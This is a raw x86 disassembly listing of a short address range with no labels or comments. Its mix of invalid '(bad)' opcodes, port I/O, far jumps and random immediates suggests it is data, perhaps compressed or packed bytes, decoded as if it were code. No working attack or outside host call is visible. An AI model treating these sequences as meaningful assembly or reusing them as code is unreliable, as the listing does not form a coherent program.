  41ba74:	jns    0x41ba24
  41ba76:	and    esp,DWORD PTR [ecx+0x6]
  41ba79:	imul   esi,DWORD PTR [ecx-0x16],0xffffff9d
  41ba7d:	push   ss
  41ba7e:	push   ebp
  41ba7f:	push   ebp
  41ba80:	data16 fimul WORD PTR [edx-0x1b]
  41ba84:	sub    ecx,0xffffffa8
  41ba87:	shl    cl,0x47
  41ba8a:	mov    eax,ds:0xae587e94
  41ba8f:	in     al,0xa0
  41ba91:	inc    ecx
  41ba92:	and    eax,0xbd56499c
  41ba97:	lods   eax,DWORD PTR ds:[esi]
  41ba98:	jmp    0x41ba9a
  41ba9a:	cmp    edx,DWORD PTR [ecx-0x49]
  41ba9d:	aam    0xe2
  41ba9f:	aaa    
  41baa0:	aam    0xd9
  41baa2:	je     0x41ba2f
  41baa4:	ror    ecx,0xff
  41baa7:	push   ebx
  41baa8:	mov    dl,dh
  41baaa:	ins    BYTE PTR es:[edi],dx
  41baab:	out    0x55,eax
  41baad:	cmp    dh,BYTE PTR [esi-0x33]
  41bab0:	jmp    0x77e4:0x481534ac
  41bab7:	xlat   BYTE PTR ds:[ebx]
  41bab8:	xor    ebx,DWORD PTR [ebx-0x7e]
  41babb:	dec    BYTE PTR [esi-0x5b]
  41babe:	mov    ds:0x3a42c1c3,al
  41bac3:	sbb    al,BYTE PTR [ecx-0x1dc9e09b]
  41bac9:	out    dx,al
  41baca:	push   DWORD PTR [esi+eiz*8-0x51]
  41bace:	aad    0x9
  41bad0:	into   
  41bad1:	push   0x3172b37e
  41bad6:	inc    eax
  41bad7:	jnp    0x41baa8
  41bad9:	ficomp DWORD PTR [ebp-0x5695fb29]
  41badf:	dec    esi
  41bae0:	lds    ecx,FWORD PTR [eax+0x285c0daa]
  41bae6:	mov    dh,0xcd
  41bae8:	push   ecx
  41bae9:	scas   eax,DWORD PTR es:[edi]
  41baea:	jp     0x41bb0e
  41baec:	add    ecx,DWORD PTR [edi-0x66be7af6]
  41baf2:	pop    esi
  41baf3:	sahf   
  41baf4:	push   es
  41baf5:	stc    
  41baf6:	sbb    al,0xeb
  41baf8:	mov    es,edx
  41bafa:	test   esi,edx
  41bafc:	inc    ebp
  41bafd:	sbb    DWORD PTR [ebx],edx
  41baff:	cmc    
  41bb00:	mov    BYTE PTR [eax+0x4e6a207],ch
  41bb06:	retf   0x2a11
  41bb09:	jo     0x41bb61
  41bb0b:	out    0x10,al
  41bb0d:	(bad)  
  41bb0f:	pop    esi
  41bb10:	fwait
  41bb11:	out    0xe1,eax
  41bb13:	cmc    
  41bb14:	mov    edx,0x38d5fcc8
  41bb19:	mov    dl,0x6d
  41bb1b:	push   ebp
  41bb1c:	dec    BYTE PTR [eax-0x36]
  41bb1f:	xchg   edi,eax
  41bb20:	sub    cl,BYTE PTR [ecx+0x43d415aa]
  41bb26:	sub    dl,BYTE PTR [eax+0x5cea168f]
  41bb2c:	dec    edx
  41bb2d:	sub    cl,BYTE PTR [ecx]
  41bb2f:	or     BYTE PTR ds:0x5de7d138,bh
  41bb35:	jp     0x41bb23
  41bb37:	xor    ebx,edi
  41bb39:	arpl   WORD PTR [ecx-0x399f83c4],cx
  41bb3f:	sbb    bl,bh
  41bb41:	popa   
  41bb42:	adc    ebp,DWORD PTR [ecx-0x3e23ffc1]
  41bb48:	lods   al,BYTE PTR ds:[esi]
  41bb49:	and    al,0xa6
  41bb4b:	dec    edi
  41bb4c:	fidiv  WORD PTR cs:[ecx-0x28]
  41bb50:	dec    ecx
  41bb51:	or     al,0x5b
  41bb53:	sar    ebx,1
  41bb55:	xchg   edx,eax
  41bb56:	sti    
  41bb57:	push   cs
  41bb58:	jno    0x41bb9b
  41bb5a:	fcomi  st,st(3)
  41bb5c:	scas   al,BYTE PTR es:[edi]
  41bb5d:	aaa    
  41bb5e:	xor    ah,ch
  41bb60:	or     ah,BYTE PTR [esp+eax*2-0x17]
  41bb64:	sahf   
  41bb65:	sbb    eax,0xbb478a21
  41bb6a:	(bad)  
  41bb6c:	js     0x41bb12
  41bb6e:	jmp    0x41bb5c
  41bb70:	mul    BYTE PTR [ebx-0x882540b]
  41bb76:	and    al,dl
  41bb78:	pusha  
  41bb79:	push   esi
  41bb7a:	aam    0x7b
  41bb7c:	adc    ebx,esi
  41bb7e:	mov    ebp,ebp
  41bb80:	add    al,BYTE PTR [eax+edx*1]
  41bb83:	sbb    BYTE PTR [ebp+0x76],cl
  41bb86:	aam    0x86
  41bb88:	adc    esi,DWORD PTR [edi+eiz*4]
  41bb8b:	lahf   
  41bb8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb8d:	mov    al,BYTE PTR [ecx]
  41bb8f:	(bad)  
  41bb91:	daa    
  41bb92:	or     eax,DWORD PTR [edx]
  41bb94:	fnstenv [ebp-0x6006575e]
  41bb9a:	mov    edi,0x7e715e4c
  41bb9f:	sbb    BYTE PTR [eax+0x8],0xd8
  41bba3:	pop    edi
  41bba4:	in     eax,0x83
  41bba6:	addr16 jae 0x41bc16
  41bba9:	aaa    
  41bbaa:	mov    eax,0x38b2a7b6
  41bbaf:	outs   dx,DWORD PTR ds:[esi]
  41bbb0:	int    0x71
  41bbb2:	popa   
  41bbb3:	arpl   WORD PTR [ecx-0x5c152f2a],dx
  41bbb9:	data16 mov al,ds:0x41802998
  41bbbf:	test   al,0xa
  41bbc1:	mov    WORD PTR [esi-0x206bb831],?
  41bbc7:	push   edx
  41bbc8:	xor    bl,dl
  41bbca:	xlat   BYTE PTR ds:[ebx]
  41bbcb:	cmp    ebp,edi
  41bbcd:	inc    eax
  41bbce:	aas    
  41bbcf:	repnz and al,0xbc
  41bbd2:	mov    ebp,DWORD PTR [ecx]
  41bbd4:	mov    edx,0x52bf5c82
  41bbd9:	imul   edx,eax,0xffffffb1
  41bbdc:	enter  0x9371,0x98
  41bbe0:	xchg   edx,eax
  41bbe1:	and    DWORD PTR [ebp-0x9],edx
  41bbe4:	out    dx,al
  41bbe5:	push   es
  41bbe6:	dec    edx
  41bbe7:	push   0xffffffd2
  41bbe9:	sub    al,BYTE PTR [esi+0xbdd7b7b]
  41bbef:	adc    eax,0xe231b940
  41bbf4:	out    0x94,al
  41bbf6:	push   es
  41bbf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf8:	mov    esi,0xdba32c85
  41bbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbfe:	fild   WORD PTR [ebx]
  41bc00:	cmp    al,0x1
  41bc02:	cmp    DWORD PTR [ecx],edi
  41bc04:	inc    esi
  41bc05:	gs jg  0x41bb8a
  41bc08:	jmp    0x5834d477
  41bc0d:	jne    0x41bc39
  41bc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc10:	lock dec esp
  41bc12:	sahf   
  41bc13:	(bad)  
  41bc14:	int    0xbd
  41bc16:	sub    eax,0x8ada0ad4
  41bc1b:	(bad)  
  41bc1c:	mov    ecx,0xa953b017
  41bc21:	xor    ah,dl
  41bc23:	cmc    
  41bc24:	sbb    BYTE PTR [edi-0x17],al
  41bc27:	inc    ebp
  41bc28:	sub    al,0x97
  41bc2a:	ret    0xae7
  41bc2d:	call   DWORD PTR [ebp-0x5b]
  41bc30:	psllw  mm0,QWORD PTR [esi]
  41bc33:	mov    bl,BYTE PTR [ebp+0x334bf0d1]
  41bc39:	lock ss jg 0x41bcb7
  41bc3d:	loope  0x41bc78
  41bc3f:	and    al,0xc9
  41bc41:	cmp    eax,0x35be6899
  41bc46:	and    eax,0xfafd9693
  41bc4b:	jmp    0xa43f:0x392bbb4a
  41bc52:	xchg   ecx,eax
  41bc53:	imul   ebx,DWORD PTR [ebx+edi*4+0x61],0xffffffa3
  41bc58:	test   eax,0x14f00e83
  41bc5d:	or     bl,ah
  41bc5f:	dec    ebx
  41bc60:	enter  0x1a52,0xa6
  41bc64:	mov    ah,0x53
  41bc66:	iret   
  41bc67:	popf   
  41bc68:	pop    esp
  41bc69:	ret    
  41bc6a:	jge    0x41bcb1
  41bc6c:	rcl    DWORD PTR [ecx-0x71],0xd8
  41bc70:	arpl   WORD PTR [edx-0x56160e6e],sp
  41bc76:	icebp  
  41bc77:	xchg   esi,eax
  41bc78:	pusha  
  41bc79:	dec    ebp
  41bc7a:	lock or ah,BYTE PTR [edx-0x62]
  41bc7e:	lahf   
  41bc7f:	cdq    
  41bc80:	xor    dl,dh
  41bc82:	adc    ebx,DWORD PTR [ecx+0x40]
  41bc85:	test   esp,ebx
  41bc87:	ficom  DWORD PTR [esi]
  41bc89:	mov    ebp,0xa0ccadec
  41bc8e:	mov    cl,dh
  41bc90:	xchg   edx,eax
  41bc91:	test   BYTE PTR [ecx+edi*4],bl
  41bc94:	push   ds
  41bc95:	rol    DWORD PTR [esp+edx*4],1
  41bc98:	cmp    BYTE PTR [eax+edx*1+0x47],0xff
  41bc9d:	sub    al,0x3d
  41bc9f:	sub    al,0xeb
  41bca1:	cmp    edi,DWORD PTR [ebx+0x6d]
  41bca4:	iret   
  41bca5:	hlt    
  41bca6:	jbe    0x41bc85
  41bca8:	dec    esi
  41bca9:	fistp  DWORD PTR [ebp-0x1d2e003e]
  41bcaf:	hlt    
  41bcb0:	lods   eax,DWORD PTR ds:[esi]
  41bcb1:	aam    0xca
  41bcb3:	cmp    BYTE PTR [edi+0x7f],cl
  41bcb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb7:	xchg   BYTE PTR [edi+0x41],bh
  41bcba:	mov    eax,ds:0x97f8724d
  41bcbf:	or     al,0x7c
  41bcc1:	jbe    0x41bc9e
  41bcc3:	add    BYTE PTR [edi-0x4c806620],ah
  41bcc9:	test   BYTE PTR [edi+ebx*2+0x6d],dl
  41bccd:	pop    ebx
  41bcce:	cmp    BYTE PTR [ebp+0xf47e7f8],0x5c
  41bcd5:	push   ecx
  41bcd6:	push   edi
  41bcd7:	stc    
  41bcd8:	add    eax,0xb0e8c94a
  41bcdd:	add    edi,DWORD PTR [ecx-0x1f]
  41bce0:	add    eax,0x55cbec14
  41bce5:	das    
  41bce6:	mov    eax,0x79b3ca29
  41bceb:	xchg   ebx,eax
  41bcec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bced:	sbb    DWORD PTR [ebx+ebx*4-0x7],0x92a6df7b
  41bcf5:	mov    bl,0x74
  41bcf7:	fild   WORD PTR [ebp+0x6f]
  41bcfa:	jmp    0x587e131a
  41bcff:	pop    ecx
  41bd00:	ja     0x41bd6b
  41bd02:	leave  
  41bd03:	fs cmc 
  41bd05:	or     ebx,edi
  41bd07:	out    0xfc,al
  41bd09:	and    BYTE PTR [edi],ch
  41bd0b:	repnz push esp
  41bd0d:	dec    edi
  41bd0e:	pop    esp
  41bd0f:	inc    edi
  41bd10:	xor    ecx,DWORD PTR [ebx+0x27]
  41bd13:	pop    esp
  41bd14:	(bad)  
  41bd15:	loopne 0x41bd20
  41bd17:	(bad)  
  41bd18:	adc    eax,0x86223ae2
  41bd1d:	rcr    BYTE PTR [edi-0x6d],cl
  41bd20:	lds    edx,FWORD PTR [ecx]
  41bd22:	fs out dx,eax
  41bd24:	sub    eax,0xe6d35444
  41bd29:	test   DWORD PTR [esi],esp
  41bd2b:	sbb    DWORD PTR [ebp-0x3d],esp
  41bd2e:	or     al,0x96
  41bd30:	mov    ds:0xb7fbc895,al
  41bd35:	dec    ecx
  41bd36:	push   0x54
  41bd38:	dec    ebx
  41bd39:	jbe    0x41bda7
  41bd3b:	imul   edi,ebx,0x61
  41bd3e:	or     bl,BYTE PTR [esi-0x4c2e4a74]
  41bd44:	lods   al,BYTE PTR ds:[esi]
  41bd45:	mov    al,ds:0xf8ac86ee
  41bd4a:	scas   eax,DWORD PTR es:[edi]
  41bd4b:	inc    ecx
  41bd4c:	in     eax,0x20
  41bd4e:	push   eax
  41bd4f:	inc    ebx
  41bd50:	pop    ss
  41bd51:	std    
  41bd52:	(bad)  
  41bd53:	sub    esp,ebp
  41bd55:	jnp    0x41bdc5
  41bd57:	adc    edx,ebx
  41bd59:	in     al,dx
  41bd5a:	mov    ds:0x6f6a98e,eax
  41bd5f:	jl     0x41bd92
  41bd61:	add    cl,BYTE PTR [edx]
  41bd63:	dec    ebx
  41bd64:	leave  
  41bd65:	(bad)  
  41bd66:	retf   0xf0a7
  41bd69:	mov    ebx,0x1dbf5d3d
  41bd6e:	stos   BYTE PTR es:[edi],al
  41bd6f:	add    al,0x58
  41bd71:	pop    edx
  41bd72:	cmp    edi,esp
  41bd74:	xchg   esp,eax
  41bd75:	sub    eax,0x8aff74c0
  41bd7a:	mov    WORD PTR [eax+0x2c],?
  41bd7d:	les    edx,FWORD PTR [edx+0x22b68d43]
  41bd83:	ss stc 
  41bd85:	shr    BYTE PTR [ebp+0x68],cl
  41bd88:	adc    eax,0xf947f173
  41bd8d:	in     eax,0xc2
  41bd8f:	add    al,0x6a
  41bd91:	dec    esi
  41bd92:	adc    ebp,DWORD PTR [ebx-0x5c19a774]
  41bd98:	push   ebp
  41bd99:	arpl   WORD PTR [edx-0x65],bx
  41bd9c:	and    al,0xff
  41bd9e:	mov    ebp,0xb61776c1
  41bda3:	icebp  
  41bda4:	inc    edi
  41bda5:	push   cs
  41bda6:	(bad)  
  41bda8:	adc    BYTE PTR [ebp-0x69],ch
  41bdab:	fadd   st,st(3)
  41bdad:	sub    eax,esp
  41bdaf:	xlat   BYTE PTR ds:[ebx]
  41bdb0:	loop   0x41be05
  41bdb2:	mov    eax,ds:0x6a9481b4
  41bdb7:	out    dx,eax
  41bdb8:	or     al,dl
  41bdba:	(bad)  
  41bdbb:	mov    ah,0xf2
  41bdbd:	inc    ebx
  41bdbe:	aam    0x81
  41bdc0:	inc    esp
  41bdc1:	sbb    al,0xf7
  41bdc3:	push   ss
  41bdc4:	adc    al,0x54
  41bdc6:	dec    edi
  41bdc7:	es xor ebx,ecx
  41bdca:	leave  
  41bdcb:	sub    ecx,DWORD PTR [edx-0x10]
  41bdce:	xor    DWORD PTR [ebx+0x2dcccfc4],eax
  41bdd4:	jecxz  0x41be15
  41bdd6:	mov    edi,0xfcc885ab
  41bddb:	(bad)  
  41bddc:	int    0x88
  41bdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bddf:	sbb    BYTE PTR [ecx+0x4c7744f7],0xc6
  41bde6:	lds    esi,FWORD PTR [edx-0x36b2462]
  41bdec:	jl     0x41be50
  41bdee:	mov    dh,0xfd
  41bdf0:	test   BYTE PTR [edi+0x218478d2],al
  41bdf6:	das    
  41bdf7:	outs   dx,DWORD PTR ds:[esi]
  41bdf8:	icebp  
  41bdf9:	rep stos DWORD PTR es:[edi],eax
  41bdfb:	cdq    
  41bdfc:	scas   al,BYTE PTR es:[edi]
  41bdfd:	add    DWORD PTR ds:0xac28a3b2,ebp
  41be03:	scas   al,BYTE PTR es:[edi]
  41be04:	retf   0xd6eb
  41be07:	(bad)  
  41be08:	idiv   esi
  41be0a:	(bad)  
  41be0b:	push   edi
  41be0c:	fidiv  WORD PTR ds:0x3ee0f66c
  41be12:	int    0x39
  41be14:	sti    
  41be15:	cmp    eax,0x288abbcd
  41be1a:	clc    
  41be1b:	inc    eax
  41be1c:	xchg   esp,eax
  41be1d:	loopne 0x41bda3
  41be1f:	ror    DWORD PTR [esi+0x17],cl
  41be22:	push   edi
  41be23:	cmc    
  41be24:	mov    eax,ds:0xca5de3ff
  41be29:	jg     0x41bdcf
  41be2b:	or     al,BYTE PTR [edi-0x61f09fd5]
  41be31:	and    bh,BYTE PTR [ebx+0x3a52cc1e]
  41be37:	les    ecx,FWORD PTR [edx+0x29fb440]
  41be3d:	mov    bl,0x2f
  41be3f:	add    eax,DWORD PTR [esi+eax*2+0x76]
  41be43:	int3   
  41be44:	jnp    0x41bddb
  41be46:	stc    
  41be47:	jne    0x41be2c
  41be49:	xor    eax,0x46bbbdba
  41be4e:	mov    esp,DWORD PTR [ebx]
  41be50:	cmp    DWORD PTR [ecx],eax
  41be52:	retf   
  41be53:	bound  esi,QWORD PTR [edx+ebx*4-0x1456cdc2]
  41be5a:	test   al,0x36
  41be5c:	retf   
  41be5d:	jae    0x41be4b
  41be5f:	mov    bl,0xf1
  41be61:	mov    cl,0xb6
  41be63:	je     0x41be42
  41be65:	sub    eax,0xe618858d
  41be6a:	mov    ch,0x8d
  41be6c:	jge    0x41be1c
  41be6e:	outs   dx,BYTE PTR ds:[esi]
  41be6f:	push   ebx
  41be70:	inc    esi
  41be71:	pushf  
  41be72:	xor    cl,dh
  41be74:	dec    eax
  41be75:	jns    0x41bea4
  41be77:	or     DWORD PTR [edi],esi
  41be79:	out    0x94,eax
  41be7b:	sub    eax,0xff386117
  41be80:	das    
  41be81:	sub    BYTE PTR gs:[ebx-0x5f6dcb21],bh
  41be88:	push   esi
  41be89:	add    al,0x23
  41be8b:	mov    ebp,0x741bccbb
  41be90:	xchg   ebx,eax
  41be91:	jp     0x41be2e
  41be93:	adc    ebx,ebp
  41be95:	xchg   esp,eax
  41be96:	mov    esp,esp
  41be98:	mov    esp,0xd5922f9
  41be9d:	gs jo  0x41bf0d
  41bea0:	push   ds
  41bea1:	xor    al,0xfd
  41bea3:	lea    edi,[eax+0x73]
  41bea6:	stos   BYTE PTR es:[edi],al
  41bea7:	mov    ebp,0x9dce4fc3
  41beac:	mov    al,ds:0x18980ba8
  41beb1:	mov    ds:0x218e8b1c,al
  41beb6:	(bad)  
  41beb7:	shl    esp,1
  41beb9:	jo     0x41bec9
  41bebb:	imul   ebp,edx,0x318d6747
  41bec1:	push   ss
  41bec2:	add    esi,DWORD PTR [esi+0x6e]
  41bec5:	fcomp  DWORD PTR [edi+0x65cc0a58]
  41becb:	mov    bl,BYTE PTR [eax]
  41becd:	cmp    bh,BYTE PTR ds:0x589262bf
  41bed3:	call   0x9e87:0x781870
  41beda:	mov    ds:0x565b83eb,al
  41bedf:	(bad)  
  41bee0:	push   eax
  41bee2:	jnp    0x41be86
  41bee4:	mov    eax,0x53b5f666
  41bee9:	xchg   DWORD PTR [edi+0x57],edi
  41beec:	cs ds ret 0xba2e
  41bef1:	clc    
  41bef2:	adc    esp,esp
  41bef4:	mov    bl,0x16
  41bef6:	ret    
  41bef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bef8:	stos   DWORD PTR es:[edi],eax
  41bef9:	mov    esp,0x7a1e966e
  41befe:	sbb    esp,DWORD PTR [ecx]
  41bf00:	aad    0xfa
  41bf02:	shl    ch,1
  41bf04:	inc    ebp
  41bf05:	dec    eax
  41bf06:	jbe    0x41be90
  41bf08:	cmc    
  41bf09:	enter  0x5dec,0x40
  41bf0d:	jmp    0x5b22f58e
  41bf12:	lock adc bh,BYTE PTR [edi+0x3ee093d4]
  41bf19:	mov    al,0xe7
  41bf1b:	mov    al,0x30
  41bf1d:	test   BYTE PTR [edi+ebp*4+0x4cc6c2e],dh
  41bf24:	mov    al,ds:0x29f60f4d
  41bf29:	rol    edi,0x84
  41bf2c:	sub    eax,DWORD PTR [edi+0x9ba702b]
  41bf32:	rol    ecx,cl
  41bf34:	mov    bl,0x9d
  41bf36:	fwait
  41bf37:	cs and eax,0xc1395b5c
  41bf3d:	scas   eax,DWORD PTR es:[edi]
  41bf3e:	and    dl,cl
  41bf40:	popa   
  41bf41:	inc    esi
  41bf42:	push   esi
  41bf43:	sbb    edi,DWORD PTR [esi]
  41bf45:	sti    
  41bf46:	les    esp,FWORD PTR [edi]
  41bf48:	and    ecx,DWORD PTR [edi]
  41bf4a:	enter  0x9d39,0x93
  41bf4e:	aas    
  41bf4f:	cmp    al,0x2f
  41bf51:	test   eax,0xf59a5fcb
  41bf56:	in     al,0x65
  41bf58:	scas   eax,DWORD PTR es:[edi]
  41bf59:	loopne 0x41bf8b
  41bf5b:	scas   eax,DWORD PTR es:[edi]
  41bf5c:	loop   0x41bf18
  41bf5e:	into   
  41bf5f:	loop   0x41bf6d
  41bf61:	lock push esi
  41bf63:	mov    al,0x92
  41bf65:	pop    edx
  41bf66:	sbb    DWORD PTR [edx+ecx*1+0x4a],ebx
  41bf6a:	dec    esp
  41bf6b:	clc    
  41bf6c:	test   BYTE PTR [edi],ch
  41bf6e:	push   ecx
  41bf6f:	nop
  41bf70:	xchg   DWORD PTR [eax],edx
  41bf72:	bswap  esp
  41bf74:	and    ecx,DWORD PTR [ebp+0x506afe29]
  41bf7a:	jns    0x41bf56
  41bf7c:	push   ecx
  41bf7d:	adc    esi,DWORD PTR [ecx]
  41bf7f:	push   edi
  41bf80:	mov    ecx,0x32a2f6b9
  41bf85:	mov    ebp,0x99695e5a
  41bf8a:	xlat   BYTE PTR ds:[ebx]
  41bf8b:	lds    ecx,FWORD PTR ds:0x44ba7482
  41bf91:	out    dx,eax
  41bf92:	imul   edx,esp,0x81f8c5a4
  41bf98:	loop   0x41bfac
  41bf9a:	pop    esi
  41bf9b:	mov    al,BYTE PTR [ecx-0x10]
  41bf9e:	and    ch,bl
  41bfa0:	mov    al,0x4
  41bfa2:	jo     0x41bf75
  41bfa4:	mov    dl,0xaa
  41bfa6:	sti    
  41bfa7:	jmp    0x7511c43d
  41bfac:	(bad)  
  41bfad:	cmp    esp,DWORD PTR [ebx-0x27d5841]
  41bfb3:	sbb    esp,DWORD PTR [ebx+0x2f433079]
  41bfb9:	fwait
  41bfba:	xor    al,0x69
  41bfbc:	repz enter 0x4205,0x44
  41bfc1:	push   0x4f
  41bfc3:	cs call 0xb16:0x1b0e3654
  41bfcb:	out    0xd5,eax
  41bfcd:	loope  0x41bf82
  41bfcf:	xchg   ebp,eax
  41bfd0:	mov    esp,0x77a3b67f
  41bfd5:	push   es
  41bfd6:	out    dx,eax
  41bfd7:	xor    BYTE PTR [edx+ecx*2-0x4a],ah
  41bfdb:	mov    WORD PTR [ebp+0x3a],ds
  41bfde:	dec    edi
  41bfdf:	cwde   
  41bfe0:	mov    bl,0x1
  41bfe2:	adc    eax,0x1e8bb06b
  41bfe7:	push   cs
  41bfe8:	imul   ebx,DWORD PTR [ebp+0x27372b8c],0x254285bc
  41bff2:	pop    edi
  41bff3:	xlat   BYTE PTR ds:[ebx]
  41bff4:	sbb    ch,BYTE PTR [edi-0x32]
  41bff7:	repnz fnstsw WORD PTR [edx+0x45]
  41bffb:	cdq    
  41bffc:	or     DWORD PTR [esi+0x77],esp
  41bfff:	dec    ebp
  41c000:	mov    DWORD PTR [esi+0x14],edx
  41c003:	out    0x56,eax
  41c005:	ins    DWORD PTR es:[edi],dx
  41c006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c007:	mov    ebp,0x5259f385
  41c00c:	iret   
  41c00d:	leave  
  41c00e:	jmp    0x7697:0x3c739b50
  41c015:	sub    BYTE PTR [edx],al
  41c017:	sub    eax,0xe1daf360
  41c01c:	and    DWORD PTR [edi+0x56],ebp
  41c01f:	cs retf 0x727f
  41c023:	int    0x98
  41c025:	push   ebx
  41c026:	or     ah,BYTE PTR [edi+edi*1-0x50c1044a]
  41c02d:	out    0x9,al
  41c02f:	stc    
  41c030:	sub    dl,ch
  41c032:	and    eax,0x26a5276d
  41c037:	icebp  
  41c038:	jl     0x41c028
  41c03a:	in     al,0x3b
  41c03c:	push   edx
  41c03d:	sbb    eax,0x96361591
  41c042:	lock mov esp,DWORD PTR [edx+0x1c]
  41c046:	jp     0x41bfcc
  41c048:	loop   0x41c00b
  41c04a:	test   ch,bl
  41c04c:	adc    DWORD PTR [edi-0x69],edx
  41c04f:	out    dx,eax
  41c050:	mov    ds:0x425b17e7,al
  41c055:	ficom  DWORD PTR [ebx+0x52]
  41c058:	jne    0x41bfe3
  41c05a:	out    0x19,al
  41c05c:	cmp    al,0x11
  41c05e:	mov    esp,?
  41c060:	push   es
  41c061:	inc    edi
  41c062:	add    al,0x8
  41c064:	ss das 
  41c066:	arpl   WORD PTR [edx-0x706e35b],bx
  41c06c:	and    ebp,DWORD PTR [ebp+0x7d]
  41c06f:	add    DWORD PTR [ebp-0x7b],0x8777bb0c
  41c076:	aam    0x95
  41c078:	sub    al,0x1b
  41c07a:	add    BYTE PTR [ebp-0x22],bh
  41c07d:	lods   eax,DWORD PTR ds:[esi]
  41c07e:	scas   eax,DWORD PTR es:[edi]
  41c07f:	add    DWORD PTR [ecx+0x2f],edi
  41c082:	daa    
  41c083:	addr16 jge 0x41c0ff
  41c086:	out    dx,eax
  41c087:	or     cl,ah
  41c089:	cmc    
  41c08a:	xchg   esp,eax
  41c08b:	es jecxz 0x41c0ce
  41c08e:	aas    
  41c08f:	and    al,0x5c
  41c091:	mov    ebx,0xd781f80d
  41c096:	mov    ah,0xa4
  41c098:	add    ch,BYTE PTR [edx+0x29]
  41c09b:	mov    al,0x8
  41c09d:	mov    al,0xb7
  41c09f:	cwde   
  41c0a0:	cmp    al,0x8d
  41c0a2:	jns    0x41c06d
  41c0a4:	and    DWORD PTR [esi+0x1e],0xffffff90
  41c0a8:	std    
  41c0a9:	jmp    0x3d5f:0xa716e833
  41c0b0:	test   edx,edi
  41c0b2:	mov    cs,WORD PTR [esi-0x79]
  41c0b5:	jo     0x41c109
  41c0b7:	nop
  41c0b8:	inc    edx
  41c0b9:	mov    cl,0x28
  41c0bb:	xor    esp,edi
  41c0bd:	fisubr DWORD PTR [esi]
  41c0bf:	shl    DWORD PTR ds:0x4845bdd,1
  41c0c5:	aam    0x11
  41c0c7:	fldenv [edi+edx*8]
  41c0ca:	daa    
  41c0cb:	mov    al,ds:0xd62addc6
  41c0d0:	xlat   BYTE PTR ds:[ebx]
  41c0d1:	push   ecx
  41c0d2:	sbb    esi,ebx
  41c0d4:	jecxz  0x41c0a7
  41c0d6:	xor    al,0xcd
  41c0d8:	fmul   DWORD PTR [edi-0x14]
  41c0db:	pusha  
  41c0dc:	pop    esp
  41c0dd:	jge    0x41c10e
  41c0df:	les    eax,FWORD PTR [ebx-0x30]
  41c0e2:	inc    esi
  41c0e3:	outs   dx,DWORD PTR ds:[esi]
  41c0e4:	dec    dx
  41c0e6:	cmc    
  41c0e7:	mov    al,ds:0xa0e2b936
  41c0ec:	and    cl,BYTE PTR [eax-0x30]
  41c0ef:	ud2    
  41c0f1:	dec    esp
  41c0f2:	push   ebp
  41c0f3:	mov    ds:0x11ba118b,al
  41c0f8:	mov    bl,0xc1
  41c0fa:	cmp    eax,0x94fee146
  41c0ff:	(bad)  
  41c100:	cs jp  0x41c0be
  41c103:	push   esi
  41c104:	xchg   edx,eax
  41c105:	lea    edx,ds:0xa79cae5e
  41c10b:	cmp    dh,BYTE PTR [ebp+0x77]
  41c10e:	push   ebp
  41c10f:	jno    0x41c18b
  41c111:	aam    0x49
  41c113:	add    eax,0xf384c399
  41c118:	mov    cl,0xfe
  41c11a:	clc    
  41c11b:	cmc    
  41c11c:	pushf  
  41c11d:	enter  0x9a26,0xa3
  41c121:	inc    ecx
  41c122:	icebp  
  41c123:	cmc    
  41c124:	fwait
  41c125:	push   es
  41c126:	inc    esp
  41c127:	push   0x3ca50652
  41c12c:	pop    ss
  41c12d:	dec    ebp
  41c12e:	shl    BYTE PTR [ecx+0x18643ecf],0x84
  41c135:	pusha  
  41c136:	xlat   BYTE PTR ds:[ebx]
  41c137:	int    0x97
  41c139:	cs xchg esi,eax
  41c13b:	and    eax,0x2ba064bc
  41c140:	jno    0x41c101
  41c142:	xchg   DWORD PTR [ebp+0x258dcf05],ebp
  41c148:	jae    0x41c0ce
  41c14a:	icebp  
  41c14b:	push   edx
  41c14c:	push   ebp
  41c14d:	mov    ah,0x2c
  41c14f:	retf   0xf13
  41c152:	out    0xc6,al
  41c154:	(bad)  
  41c155:	(bad)  
  41c156:	pop    ebp
  41c157:	sub    eax,0x68c33541
  41c15c:	imul   ebx,DWORD PTR [edi+0x26383906],0x5
  41c163:	sub    al,0x14
  41c165:	cmp    BYTE PTR ds:0x97142b16,al
  41c16b:	(bad)  
  41c16c:	test   BYTE PTR [ebx+0x61],0xcf
  41c170:	outs   dx,DWORD PTR ds:[esi]
  41c171:	mov    ah,0x9
  41c173:	sub    al,0xc5
  41c175:	std    
  41c176:	hlt    
  41c177:	ja     0x41c11b
  41c179:	xor    BYTE PTR [edx+0x5f98335d],al
  41c17f:	mov    WORD PTR [ecx+0x16],ss
  41c182:	fisubr DWORD PTR [edx]
  41c184:	pop    esi
  41c185:	ficom  WORD PTR [edi]
  41c187:	mov    dh,al
  41c189:	ins    BYTE PTR es:[edi],dx
  41c18a:	in     al,0xc5
  41c18c:	cli    
  41c18d:	pop    edi
  41c18e:	xchg   ecx,eax
  41c18f:	sti    
  41c190:	push   es
  41c191:	dec    ebx
  41c192:	das    
  41c193:	es out dx,al
  41c195:	loopne 0x41c172
  41c197:	aam    0x13
  41c199:	inc    edi
  41c19a:	sbb    eax,0x3bfb3a02
  41c19f:	aad    0x25
  41c1a1:	mov    eax,ds:0xd44b8c15
  41c1a6:	dec    esp
  41c1a7:	outs   dx,BYTE PTR ds:[esi]
  41c1a8:	pop    edi
  41c1a9:	sub    al,0x2e
  41c1ab:	lds    ecx,FWORD PTR [edi-0x7b5ca34d]
  41c1b1:	clc    
  41c1b2:	mov    cl,0x5d
  41c1b4:	rol    DWORD PTR [eax+0x61026ae7],0xf5
  41c1bb:	shl    DWORD PTR [edx],1
  41c1bd:	loop   0x41c1ec
  41c1bf:	arpl   WORD PTR [ecx+edx*2+0x30b7a85c],bx
  41c1c6:	mov    BYTE PTR [edx-0x7c0fae44],cl
  41c1cc:	push   ebx
  41c1cd:	aas    
  41c1ce:	imul   ebx,DWORD PTR [eax+eax*8-0x312b9bfd],0xd86a3a54
  41c1d9:	add    eax,0xbdee591b
  41c1de:	add    ebx,ebx
